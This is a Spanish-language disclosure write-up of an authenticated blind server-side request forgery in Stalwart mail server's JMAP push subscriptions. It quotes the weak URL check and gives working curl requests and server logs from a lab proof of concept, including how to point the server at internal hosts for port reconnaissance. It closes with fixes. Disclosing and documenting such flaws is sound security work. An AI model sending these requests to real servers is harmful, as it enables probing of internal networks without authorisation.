JMAP PushSubscription SSRF_

HighServer-side request forgeryNo response
StalwartSSRFJMAPPush Notifications

Alcance: la vulnerabilidad fue reproducida contra una instancia self-hosted de Stalwart en un laboratorio Docker aislado, utilizando una cuenta de mailbox normal sin privilegios administrativos. La validación se realizó con valores y destinos de prueba controlados.

Durante la revisión de Stalwart encontré un Server-Side Request Forgery (SSRF) almacenado y autenticado en el flujo JMAP PushSubscription/set y el servicio de entrega de push.

Cualquier usuario autenticado de un mailbox podía crear una suscripción JMAP con una URL arbitraria. El servidor únicamente comprobaba que el string comenzara con https:// y tuviera menos de 512 caracteres; no resolvía el hostname ni verificaba la IP de destino.

En aproximadamente un segundo después de crear la suscripción, Stalwart enviaba automáticamente un POST hacia esa URL desde el propio servidor de correo. No se requería rol administrativo, interacción posterior del usuario ni configuración especial más allá de los valores predeterminados.

Validación insuficiente de la URL

En crates/jmap/src/push/set.rs, el valor recibido para url solo se aceptaba si cumplía dos condiciones sintácticas:

(PushSubscriptionProperty::Url, Value::Str(value))
    if is_create && value.len() < 512 && value.starts_with("https://") =>
{
    push.url = value.into_owned();
}

No había resolución de hostname, filtro de IPs privadas, loopback o link-local, ni allowlist de egress. El campo keys tampoco era necesario: set.rs únicamente exigía que deviceClientId y url no estuvieran vacíos para crear una suscripción suficiente para disparar la entrega.

Cadena de ejecución

Después de guardar la suscripción, el push manager realizaba automáticamente un primer POST de verificación:

PushSubscription/set create
        ↓
PushEvent::PushServerUpdate
        ↓
verification dispatch
        ↓
http_request
        ↓
POST a la URL controlada

El primer intento no se retrasaba porque un mapa last_verify vacío se interpretaba como elegible:

// crates/services/src/state_manager/push.rs
... .unwrap_or(true) ...

La conexión se construía usando un cliente reqwest normal:

// crates/services/src/state_manager/http.rs
    .build().unwrap_or_default()
    .post(details.url.as_str())

No había allowlist de egress, proxy obligatorio ni protección contra DNS rebinding antes de realizar la conexión.

Prueba de concepto local

La reproducción utilizó la imagen oficial stalwartlabs/stalwart:latest en un laboratorio Docker local y una cuenta de mailbox normal no administrativa. El host <stalwart-host> representa únicamente la instancia de prueba.

1. Autenticación

curl -sk -u 'victim@lab.test:<password>' \
  https://<stalwart-host>/.well-known/jmap

La cuenta normal pudo acceder al servicio JMAP sin requerir permisos especiales.

2. Crear una suscripción hacia un host interno

curl -sk -u 'victim@lab.test:<password>' \
  -H 'Content-Type: application/json' \
  -X POST https://<stalwart-host>/jmap \
  -d '{
    "using": ["urn:ietf:params:jmap:core"],
    "methodCalls": [[
      "PushSubscription/set",
      {
        "create": {
          "s1": {
            "deviceClientId": "ssrf-poc",
            "url": "https://<internal-target>:8443/ssrf-poc"
          }
        }
      },
      "c1"
    ]]
  }'

La respuesta confirmó la aceptación de la suscripción:

{
  "methodResponses": [[
    "PushSubscription/set",
    {
      "accountId": "d",
      "created": {
        "s1": {
          "id": "<SUBSCRIPTION_ID>",
          "keys": null,
          "expires": "2026-08-20T09:01:31Z"
        }
      }
    },
    "c1"
  ]]
}

3. POST saliente automático

En aproximadamente un segundo, los logs estructurados del servidor registraron el intento saliente sin ninguna acción adicional del cliente:

DEBUG JMAP method call ... id = "PushSubscription/set", accountId = 3, elapsed = 2ms
DEBUG Push subscription error details = "HTTP POST failed",
  url = "https://internal-target:8443/ssrf-poc",
  reason = "error sending request for url (https://internal-target:8443/ssrf-poc)"

El accountId = 3 correspondía a la cuenta de mailbox normal utilizada en la prueba, no a la cuenta administrativa del laboratorio.

4. Confirmación end-to-end

Al repetir la prueba contra un listener HTTPS controlado con un certificado válido, el servidor devolvió 200 OK y recibió el body JSON generado por Stalwart con el evento PushVerification. Esto confirmó la conexión completa desde la creación de la suscripción hasta el envío de la petición.

Alcance de la SSRF

El resultado confirmado es una SSRF blind contra hosts internos o externos HTTPS. El cliente JMAP no recibe el body de la respuesta del destino; únicamente puede observar indirectamente si la conexión tuvo éxito, timeout o fallo de handshake TLS.

Estas señales siguen siendo suficientes para reconocimiento de red y puertos, distinguiendo destinos abiertos, cerrados o filtrados según los tiempos y errores observados por el servidor.

Límites confirmados

  • No hay control del body de la petición saliente.
  • La respuesta del destino no se devuelve al cliente ni se procesa como contenido confiable del servidor.
  • La bandera verified solo se establece mediante un round-trip separado con verificationCode suministrado explícitamente por el cliente JMAP.
  • El prefijo obligatorio https:// bloquea el acceso directo clásico por HTTP a 169.254.169.254.
  • La entrega está limitada por defecto a aproximadamente un intento cada 60 segundos por cuenta.

La limitación temporal reduce la velocidad de escaneo, pero no bloquea el acceso a destinos internos. En un entorno multi-tenant puede paralelizarse mediante varias cuentas controladas por el atacante.

Impacto

Cualquier usuario autenticado de un mailbox podía hacer que el servidor de correo estableciera conexiones HTTPS hacia destinos elegidos por el usuario, sin interacción posterior y sin configuración adicional.

El impacto principal confirmado era:

  • Reconocimiento de hosts y puertos internos mediante diferencias de conexión, timeout y handshake TLS.
  • Conexiones salientes hacia servicios HTTPS internos o de terceros.
  • Uso del servidor de correo como punto de salida desde su red.

No confirmé impacto de integridad derivado de la respuesta del destino, acceso directo a metadata IMDS ni lectura del body de respuestas internas.

Corrección sugerida

  • Resolver el hostname antes de conectar y rechazar loopback, link-local, multicast y rangos privados IPv4/IPv6.
  • Validar nuevamente el destino después de cada resolución para reducir el riesgo de DNS rebinding.
  • Aplicar una allowlist de egress para destinos de push aprobados.
  • Deshabilitar redirecciones hacia destinos no validados o validar cada salto.
  • Aplicar timeouts y límites de conexión por cuenta y por destino.
  • Añadir pruebas de regresión para localhost, RFC1918, link-local, IPv6 local y nombres que resuelvan a rangos internos.

Estado

La investigación fue reproducida localmente contra Stalwart main / 0.16.18. El reporte original no incluye identificador CVE ni severidad. El maintainer no respondió y este artículo documenta el hallazgo con el estado de divulgación disponible.
